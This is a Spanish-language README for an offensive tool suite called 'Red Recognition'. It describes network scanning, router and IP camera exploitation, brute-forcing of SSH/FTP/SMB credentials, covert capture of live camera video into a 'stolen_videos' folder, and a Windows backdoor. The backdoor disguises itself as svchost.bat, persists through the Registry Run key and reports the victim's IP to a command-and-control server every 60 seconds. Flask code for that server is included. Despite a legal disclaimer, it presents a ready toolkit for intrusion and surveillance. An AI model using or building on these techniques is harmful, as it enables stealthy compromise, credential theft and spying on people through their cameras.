# Red Recognition - Pentesting Automation Suite

Sistema modular automatizado de reconocimiento y explotación de redes para pruebas de penetración profesionales.

## ⚠️ ADVERTENCIA LEGAL

**USO EXCLUSIVO PARA PRUEBAS AUTORIZADAS**

Este software está diseñado EXCLUSIVAMENTE para:
- Pruebas de penetración autorizadas
- Auditorías de seguridad con permiso explícito
- Evaluaciones de seguridad en redes propias

**EL USO NO AUTORIZADO ES ILEGAL** y puede resultar en procesamiento criminal, multas significativas y tiempo en prisión.

## 🚀 Características

### Módulos Implementados

1. **Módulo 1: Network Reconnaissance**
   - Escaneo completo de red WiFi
   - Descubrimiento de hosts activos
   - Escaneo de puertos y servicios
   - Detección de sistema operativo
   - Opción de saltar escaneo de puertos

2. **Módulo 2: File Harvester**
   - Descarga de archivos compartidos (SMB/FTP/HTTP)
   - Búsqueda de datos sensibles
   - Organización automática por host

3. **Módulo 3: Router Exploitation**
   - Explotación de routers (especialmente Ruijie Networks)
   - Credenciales por defecto y fuerza bruta
   - Descarga de configuración del router
   - Extracción de credenciales WiFi
   - **Instalación de backdoors remotos**

4. **Módulo 4: Camera/XVR Exploitation**
   - Explotación de cámaras IP y DVR/NVR
   - Acceso a streams RTSP
   - **Captura de video en vivo (hasta 3 min o 200MB)**
   - Screenshots automáticos
   - Descarga de configuraciones

5. **Módulo 5: Service Exploitation**
   - Explotación de servicios específicos
   - Ataques a DNS, HTTP, lighttpd
   - Directory traversal
   - Identificación de servicios tcpwrapped

6. **Módulo 6: Credential Harvesting**
   - Fuerza bruta a SSH, FTP, SMB
   - Diccionario de credenciales comunes
   - **Almacenamiento de credenciales comprometidas**
   - Movimiento lateral

7. **Módulo 7: Backdoor & Persistence Manager**
   - **Instalación de backdoors en Windows**
   - **Payload con reporte a C2 server**
   - Persistencia via registry (Windows)
   - Persistencia via crontab (Linux)
   - Ejecución invisible (VBS)
   - **Reporte de IP pública cada 60 segundos**

8. **Módulo 8: Report Generator**
   - Informe consolidado JSON
   - **Informe ejecutivo HTML**
   - Score de riesgo (0-100)
   - Hallazgos críticos
   - Recomendaciones priorizadas

## 📦 Instalación

### Requisitos
- Python 3.8+
- Kali Linux recomendado (puede funcionar en otras distribuciones)
- Privilegios de root/administrador

### Dependencias

```bash
# Instalar dependencias del sistema (Debian/Ubuntu/Kali)
sudo apt-get update
sudo apt-get install -y python3-pip nmap curl dig

# Instalar dependencias de Python
pip3 install -r requirements.txt
```

### Configuración

1. **Copiar archivo de configuración:**
```bash
cp config.env.example config.env
```

2. **Editar config.env con tus valores:**
```bash
nano config.env
```

Configurar especialmente:
- `C2_SERVER_URL`: Tu servidor de Command & Control para recibir IPs comprometidas
- `C2_IDENTIFIER`: Identificador único para tus ataques (ej: EUROPEAN, PROJECT_X, etc.)
- `ROUTER_BACKDOOR_*`: Credenciales para backdoors en router
- Otros parámetros según necesites

## 🎮 Uso

### Ejecución Básica

```bash
sudo python3 main.py
```

### Modos de Ejecución

El script presenta un menú interactivo con las siguientes opciones:

1. **🎯 Ejecutar TODO (Full Pentesting Suite)**
   - Ejecuta todos los módulos secuencialmente
   - Te pregunta qué hacer en cada módulo
   - Genera informe consolidado al final

2. **📋 Seleccionar módulos manualmente**
   - Eliges exactamente qué módulos ejecutar
   - Control total sobre el proceso

3. **⚡ Modo rápido**
   - Solo credenciales y servicios críticos
   - Ideal para evaluaciones rápidas

4. **🔍 Solo reconocimiento**
   - Sin ataques, solo escaneo
   - Perfecto para fase inicial

5. **📊 Solo generar informe**
   - Consolida informes existentes
   - Genera HTML ejecutivo

### Ejemplo de Flujo Completo

```bash
sudo python3 main.py

# 1. Acepta advertencia legal
# 2. Selecciona "Ejecutar TODO"
# 3. Confirma cada módulo:
#    - Reconocimiento: SÍ (con escaneo de puertos)
#    - File Harvester: SÍ
#    - Router Exploit: SÍ (con backdoor)
#    - Camera Exploit: SÍ (capturar video)
#    - Service Exploit: SÍ
#    - Credential Harvest: SÍ
#    - Backdoor Manager: SÍ
# 4. Espera a que termine (puede tardar 30-60 minutos)
# 5. Revisa informes en reports/
```

## 📁 Estructura de Archivos

```
RedRecognition/
├── main.py                          # Script principal
├── config.env.example               # Ejemplo de configuración
├── config.env                       # Tu configuración (NO SUBIR A GIT)
├── requirements.txt                 # Dependencias Python
├── modules/                         # Módulos de ataque
│   ├── __init__.py
│   ├── network_recon.py
│   ├── file_harvester.py
│   ├── router_exploit.py
│   ├── camera_exploit.py
│   ├── service_exploit.py
│   ├── credential_harvest.py
│   ├── backdoor_manager.py
│   └── report_generator.py
├── reports/                         # Informes generados
│   ├── informe_reconocimiento.json
│   ├── informe_router_exploitation.json
│   ├── informe_camera_exploitation.json
│   ├── informe_service_exploitation.json
│   ├── informe_credential_harvesting.json
│   ├── informe_backdoor_persistence.json
│   ├── INFORME_GENERAL_PENTESTING.json
│   └── INFORME_EJECUTIVO.html       # ⭐ ABRIR ESTE EN NAVEGADOR
├── loot/                            # Datos robados
│   ├── stolen_videos/               # Videos capturados
│   ├── router_configs/              # Configs de router
│   ├── credentials/                 # Credenciales encontradas
│   │   ├── credentials_found.json
│   │   └── credentials_found.txt
│   └── backdoors/                   # Instrucciones de backdoors
│       └── access_instructions.txt  # ⭐ COMO ACCEDER A BACKDOORS
└── harvested_files/                 # Archivos compartidos descargados
```

## 🎯 Funcionalidades Destacadas

### Backdoor de Windows

El módulo de backdoors instala un payload avanzado en sistemas Windows comprometidos:

**Características:**
- ✅ Ejecución completamente invisible (sin ventana)
- ✅ Persistencia automática (Registry Run Key)
- ✅ Reporte de IP pública al C2 cada 60 segundos
- ✅ Identificador personalizable
- ✅ Sobrevive a reinicios
- ✅ Proceso en background

**Funcionamiento:**
1. Crea script batch en `%temp%\svchost.bat`
2. Crea VBScript invisible en `%temp%\invisible.vbs`
3. Agrega entrada en `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
4. Ejecuta cada 60 segundos: obtiene IP pública y la envía a tu C2
5. Formato: `http://TU_C2/?ip=EUROPEAN_X.X.X.X`

### Captura de Video

El módulo de cámaras captura video real de streams RTSP:

**Características:**
- ✅ Captura hasta 3 minutos o 200MB (configurable)
- ✅ Formato MP4 compatible
- ✅ Screenshots automáticos
- ✅ Múltiples cámaras simultáneas
- ✅ Progreso en tiempo real

### Informe Ejecutivo HTML

Genera un informe visual profesional con:

- Score de riesgo (0-100) con código de colores
- Resumen ejecutivo con métricas clave
- Hallazgos críticos destacados
- Recomendaciones priorizadas
- Diseño responsive y profesional

## 🛡️ Remediación Post-Prueba

**IMPORTANTE:** Después de una prueba autorizada, debes:

1. **Remover todos los backdoors:**
   ```bash
   # Windows: eliminar entradas de registry y archivos temp
   # Linux: eliminar entradas de crontab y scripts
   ```

2. **Notificar al cliente sobre:**
   - Todas las credenciales comprometidas
   - Backdoors instalados y ubicaciones exactas
   - Videos/archivos capturados
   - Configuraciones descargadas

3. **Proporcionar:**
   - Informe ejecutivo HTML
   - Informe técnico JSON completo
   - Instrucciones de remediación

## 🔧 Configuración Avanzada

### Servidor C2 para Backdoors

Para recibir reportes de backdoors, configura un servidor simple:

```python
# simple_c2.py
from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def receive_ip():
    ip = request.args.get('ip', 'unknown')
    print(f"[+] Received IP: {ip}")
    with open('compromised_ips.log', 'a') as f:
        f.write(f"{ip}\n")
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

```bash
python3 simple_c2.py
```

### Ajustar Agresividad

En `config.env`:

```ini
# Nivel de agresividad (1-5)
ATTACK_AGGRESSIVENESS=3

# Delay entre intentos (segundos)
ATTACK_DELAY=0.5

# Threads para fuerza bruta
BRUTE_FORCE_THREADS=5

# Máximo de intentos por servicio
MAX_ATTEMPTS_PER_SERVICE=50
```

## 📊 Interpretación de Resultados

### Risk Score

- **0-20**: Riesgo BAJO - Pocas vulnerabilidades
- **21-40**: Riesgo MEDIO - Vulnerabilidades presentes
- **41-70**: Riesgo ALTO - Múltiples vectores de ataque
- **71-100**: Riesgo CRÍTICO - Compromisos confirmados

### Status de Módulos

- **SUCCESS**: Objetivo comprometido exitosamente
- **PARTIAL**: Vulnerabilidades encontradas pero no explotadas
- **FAILED**: No se encontraron vulnerabilidades
- **ERROR**: Error durante ejecución

## 🐛 Troubleshooting

### Error: "Permission denied"
```bash
# Asegúrate de ejecutar con sudo
sudo python3 main.py
```

### Error: "Module not found"
```bash
# Reinstalar dependencias
pip3 install -r requirements.txt --force-reinstall
```

### Video no se captura
```bash
# Verificar OpenCV
python3 -c "import cv2; print(cv2.__version__)"

# Reinstalar si es necesario
pip3 install opencv-python opencv-contrib-python
```

### Backdoor no funciona en Windows
- Verificar que curl esté disponible en Windows (Windows 10+)
- Verificar que el firewall no bloquee conexiones salientes
- Verificar que el C2 server esté accesible

## 🤝 Contribuciones

Este es un proyecto de pentesting profesional. Las contribuciones son bienvenidas siempre que:

1. Mantengan el enfoque de seguridad ofensiva
2. Incluyan documentación adecuada
3. Respeten las advertencias legales
4. Sean funcionales y probadas

## 📝 Licencia

Este software se proporciona "AS IS" para propósitos educativos y de seguridad autorizada únicamente.

El autor no se hace responsable del uso indebido de esta herramienta.

## 👤 Autor

Red Recognition - Pentesting Automation Suite
Versión 2.0

---

**Recuerda:** Usa esta herramienta de manera responsable y ética. Siempre obtén autorización explícita antes de realizar pruebas de penetración.
